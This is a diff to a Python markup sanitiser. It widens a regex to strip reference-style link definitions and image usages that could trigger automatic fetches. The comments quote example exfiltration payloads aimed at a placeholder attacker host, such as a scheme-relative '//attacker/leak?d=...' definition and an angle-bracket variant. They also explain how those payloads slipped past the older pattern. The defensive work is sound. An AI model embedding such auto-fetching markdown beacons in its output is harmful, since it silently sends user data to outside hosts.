@@ -182,7 +182,34 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     r'|<style\b[^>]*>.*?</style>'
     r'|<style\b[^>]*>'
     r'|@import\s+url\([^)]*\)'
-    r'|\[[^\]]+\]:\s*(?:https?|data|javascript|vbscript|file|ftp):[^\s]+'
+    # Reference-style link/image DEFINITION — `[label]: destination`.
+    # The explicit-scheme arm above this comment block predates these
+    # and stays (unanchored defence-in-depth); it missed scheme-
+    # relative (`[r]: //attacker/leak?d=...` inherits the page scheme)
+    # and angle-bracket (`[r]: <https://attacker/leak>`, which may
+    # contain spaces) destinations, so exfil rode the definition while
+    # the scheme spelling dodged the pattern. The renderer, not the
+    # scheme token, decides fetchability — strip definitions
+    # REGARDLESS of destination shape. Line-anchored (CommonMark/GFM
+    # only recognise definitions at 0-3 columns of indent), which
+    # keeps JS computed keys (`{ [key]: value }`) and similar code out
+    # of the match; the bounded `\s{0,16}` after the colon covers the
+    # legal next-line destination. Angle arm first (its destination
+    # may contain whitespace), bare-token arm second. An over-8KB
+    # destination has its head redacted, which destroys the `[label]:`
+    # prefix and leaves the tail inert.
+    r'|(?m:^ {0,3}\[[^\]]{1,8192}\]:\s{0,16}<[^>\n]{0,8192}>)'
+    r'|(?m:^ {0,3}\[[^\]]{1,8192}\]:\s{0,16}[^\s]{1,8192})'
+    # Reference-style image USAGE — full `![alt][ref]` and collapsed
+    # `![ref][]` forms. Belt-and-braces beside the definition strip
+    # above (a usage whose definition is stripped renders as plain
+    # text): defends documents assembled from multiple sources where a
+    # definition might arrive outside this sanitiser. The lookbehind
+    # keeps `vec![0; 10]`-style macro/negation code out; the shortcut
+    # form `![ref]` is deliberately NOT matched (too FP-prone on
+    # `![expr]` negations — it cannot fetch without a definition,
+    # which the arms above strip).
+    r'|(?<![\w!])!\[[^\]]{0,8192}\]\[[^\]]{0,8192}\]'
     # Bound the data: URI tail. Pre-fix `[a-zA-Z0-9+./;-]+` (mediatype)
     # plus `[^\s)]*` (payload) was unbounded — a 10 MB base64-encoded
     # blob inside a single `data:` URI would force the regex engine to
